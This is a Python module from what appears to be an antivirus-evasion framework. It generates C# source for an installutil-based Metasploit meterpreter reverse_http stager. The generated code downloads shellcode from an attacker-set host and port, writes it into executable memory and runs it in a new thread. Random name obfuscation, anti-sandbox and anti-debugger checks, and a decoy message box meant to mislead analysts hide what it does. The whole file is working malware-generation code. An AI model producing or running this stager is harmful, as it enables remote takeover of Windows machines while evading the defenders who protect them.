"""

Custom-written pure installutil meterpreter/reverse_http stager.
Uses basic variable renaming obfuscation.

Module built by @ConsciousHacker

"""

from lib.common import helpers
from Tools.Bypass.bypass_common import bypass_helpers
from Tools.Bypass.bypass_common import encryption
from Tools.Bypass.bypass_common import gamemaker
import random


class PayloadModule:

    def __init__(self, cli_obj):
        # required options
        self.description = "pure installutil windows/meterpreter/reverse_http stager"
        self.language = "installutil"
        self.extension = "cs"
        self.rating = "Excellent"
        self.name = "Pure installutil Reverse HTTP Stager"
        self.path = "installutil/meterpreter/rev_http"
        self.cli_opts = cli_obj
        self.payload_source_code = ''
        if cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''
        self.cli_shellcode = False

        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {
                                    "COMPILE_TO_DLL" : ["N", "Compile to a DLL"],
                                    "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
                                    "LHOST"            : ["", "IP of the Metasploit handler"],
                                    "LPORT"            : ["80", "Port of the Metasploit handler"],
                                    "INJECT_METHOD"  : ["Virtual", "Virtual or Heap"],
                                    "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days"],
                                    "HOSTNAME"       : ["X", "Optional: Required system hostname"],
                                    "DOMAIN"         : ["X", "Optional: Required internal domain"],
                                    "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
                                    "USERNAME"       : ["X", "Optional: The required user account"],
                                    "TIMEZONE"       : ["X", "Optional: Check to validate not in UTC"],
                                    "DEBUGGER"       : ["X", "Optional: Check if debugger is attached"],
                                    "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
                                }

    def generate(self):
        # get random variables for the API imports
        r = [bypass_helpers.randomString() for x in range(16)]
        y = [bypass_helpers.randomString() for x in range(17)]

        # installutil random class variables
        className = bypass_helpers.randomString()
        classNameTwo = bypass_helpers.randomString()
        classNameThree = bypass_helpers.randomString()
        execName = bypass_helpers.randomString()
        savedStateName = bypass_helpers.randomString()

        #required syntax at the beginning of any/all payloads
        payload_code = "using System; using System.Net; using System.Linq; using System.Net.Sockets; using System.Runtime.InteropServices; using System.Threading; using System.Configuration.Install; using System.Windows.Forms;\n"
        payload_code += "\tpublic class {0} {{\n".format(className)
        payload_code += "\t\tpublic static void Main()\n\t\t{\n"
        # lets add a message box to throw offf sandbox heuristics and analysts :)
        # there is no decryption routine, troll.level = 9000
        # TODO: add a fake decryption function that does nothing and accepts messWithAnalystName as a parameter.
        payload_code += "\t\t\twhile(true)\n{{ MessageBox.Show(\"doge\"); Console.ReadLine();}}\n"
        payload_code += "\t\t}\n\t}\n\n"
        payload_code += "\t[System.ComponentModel.RunInstaller(true)]\n"
        payload_code += "\tpublic class {0} : System.Configuration.Install.Installer\n\t{{\n".format(classNameTwo)
        payload_code += "\t\tpublic override void Uninstall(System.Collections.IDictionary {0})\n\t\t{{\n".format(savedStateName)
        payload_code += "\t\t\t{0}.{1}();\n\t\t}}\n\t}}\n".format(classNameThree, execName)
        payload_code += "\n\tpublic class {0}\n\t{{".format(classNameThree)
        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += """\t\t[DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 %s,UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s,IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s);\n"""%(r[0],r[1],r[2],r[3],r[4],r[5],r[6],r[7],r[8],r[9],r[10],r[11])
        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
            payload_code += """\t\t[DllImport(\"kernel32\")] private static extern UInt32 HeapCreate(UInt32 %s, UInt32 %s, UInt32 %s); \n[DllImport(\"kernel32\")] private static extern UInt32 HeapAlloc(UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 RtlMoveMemory(UInt32 %s, byte[] %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s, IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s);"""%(y[0],y[1],y[2],y[3],y[4],y[5],y[6],y[7],y[8],y[9],y[10],y[11],y[12],y[13],y[14],y[15],y[16])

        # code for the randomString() function
        randomStringName = bypass_helpers.randomString()
        bufferName = bypass_helpers.randomString()
        charsName = bypass_helpers.randomString()
        t = list("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")
        random.shuffle(t)
        chars = ''.join(t)

        # code for the randomString() method
        payload_code += "static string %s(Random r, int s) {\n" %(randomStringName)
        payload_code += "char[] %s = new char[s];\n"%(bufferName)
        payload_code += "string %s = \"%s\";\n" %(charsName, chars)
        payload_code += "for (int i = 0; i < s; i++){ %s[i] = %s[r.Next(%s.Length)];}\n" %(bufferName, charsName, charsName)
        payload_code += "return new string(%s);}\n" %(bufferName)


        # code for the checksum8() function
        checksum8Name = bypass_helpers.randomString()
        payload_code += "static bool %s(string s) {return ((s.ToCharArray().Select(x => (int)x).Sum()) %% 0x100 == 92);}\n" %(checksum8Name)


        # code fo the genHTTPChecksum() function
        genHTTPChecksumName = bypass_helpers.randomString()
        baseStringName = bypass_helpers.randomString()
        randCharsName = bypass_helpers.randomString()
        urlName = bypass_helpers.randomString()
        random.shuffle(t)
        randChars = ''.join(t)

        payload_code += "static string %s(Random r) { string %s = \"\";\n" %(genHTTPChecksumName,baseStringName)
        payload_code += "for (int i = 0; i < 64; ++i) { %s = %s(r, 3);\n" %(baseStringName,randomStringName)
        payload_code += "string %s = new string(\"%s\".ToCharArray().OrderBy(s => (r.Next(2) %% 2) == 0).ToArray());\n" %(randCharsName,randChars)
        payload_code += "for (int j = 0; j < %s.Length; ++j) {\n" %(randCharsName)
        payload_code += "string %s = %s + %s[j];\n" %(urlName,baseStringName,randCharsName)
        payload_code += "if (%s(%s)) {return %s;}}} return \"9vXU\";}"%(checksum8Name,urlName, urlName)


        # code for getData() function
        getDataName = bypass_helpers.randomString()
        strName = bypass_helpers.randomString()
        webClientName = bypass_helpers.randomString()
        sName = bypass_helpers.randomString()

        payload_code += "static byte[] %s(string %s) {\n" %(getDataName,strName)
        payload_code += "WebClient %s = new System.Net.WebClient();\n" %(webClientName)
        payload_code += "%s.Headers.Add(\"User-Agent\", \"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\");\n" %(webClientName)
        payload_code += "%s.Headers.Add(\"Accept\", \"*/*\");\n" %(webClientName)
        payload_code += "%s.Headers.Add(\"Accept-Language\", \"en-gb,en;q=0.5\");\n" %(webClientName)
        payload_code += "%s.Headers.Add(\"Accept-Charset\", \"ISO-8859-1,utf-8;q=0.7,*;q=0.7\");\n" %(webClientName)
        payload_code += "byte[] %s = null;\n" %(sName)
        payload_code += "try { %s = %s.DownloadData(%s);\n" %(sName, webClientName, strName)
        payload_code += "if (%s.Length < 100000) return null;}\n" %(sName)
        payload_code += "catch (WebException) {}\n"
        payload_code += "return %s;}\n" %(sName)


        # code fo the inject() function to inject shellcode
        injectName = bypass_helpers.randomString()
        sName = bypass_helpers.randomString()
        funcAddrName = bypass_helpers.randomString()
        hThreadName = bypass_helpers.randomString()
        threadIdName = bypass_helpers.randomString()
        pinfoName = bypass_helpers.randomString()

        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += "static void %s(byte[] %s) {\n" %(injectName, sName)
            payload_code += "    if (%s != null) {\n" %(sName)
            payload_code += "        UInt32 %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40);\n" %(funcAddrName, sName)
            payload_code += "        Marshal.Copy(%s, 0, (IntPtr)(%s), %s.Length);\n" %(sName,funcAddrName, sName)
            payload_code += "        IntPtr %s = IntPtr.Zero;\n" %(hThreadName)
            payload_code += "        UInt32 %s = 0;\n" %(threadIdName)
            payload_code += "        IntPtr %s = IntPtr.Zero;\n" %(pinfoName)
            payload_code += "        %s = CreateThread(0, 0, %s, %s, 0, ref %s);\n" %(hThreadName, funcAddrName, pinfoName, threadIdName)
            payload_code += "        WaitForSingleObject(%s, 0xFFFFFFFF); }}\n" %(hThreadName)

        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":

            payload_code += "static void %s(byte[] %s) {\n" %(injectName, sName)
            payload_code += "    if (%s != null) {\n" %(sName)
            payload_code += '       UInt32 {} = HeapCreate(0x00040000, (UInt32){}.Length, 0);\n'.format(pinfoName, sName)
            payload_code += '       UInt32 {} = HeapAlloc({}, 0x00000008, (UInt32){}.Length);\n'.format(funcAddrName, pinfoName, sName)
            payload_code += '       RtlMoveMemory({}, {}, (UInt32){}.Length);\n'.format(funcAddrName, sName, sName)
            payload_code += '       UInt32 {} = 0;\n'.format(threadIdName)
            payload_code += '       IntPtr {} = CreateThread(0, 0, {}, IntPtr.Zero, 0, ref {});\n'.format(hThreadName, funcAddrName, threadIdName)
            payload_code += '       WaitForSingleObject({}, 0xFFFFFFFF);}}}}\n'.format(hThreadName)


        # code for Main() to launch everything
        sName = bypass_helpers.randomString()
        randomName = bypass_helpers.randomString()

        num_tabs_required = 0

        payload_code += "\n\t\tpublic static void {0}() {{\n".format(execName)
        payload_code2, num_tabs_required = gamemaker.senecas_games(self)
        payload_code = payload_code + payload_code2
        num_tabs_required += 2

        payload_code += "Random %s = new Random((int)DateTime.Now.Ticks);\n" %(randomName)
        payload_code += "byte[] %s = %s(\"http://%s:%s/\" + %s(%s));\n" %(sName, getDataName, self.required_options["LHOST"][0],self.required_options["LPORT"][0],genHTTPChecksumName,randomName)
        payload_code += "%s(%s);\n" %(injectName, sName)

        while (num_tabs_required != 0):
            payload_code += '\t' * num_tabs_required + '}'
            num_tabs_required -= 1

        self.payload_source_code = payload_code
        return
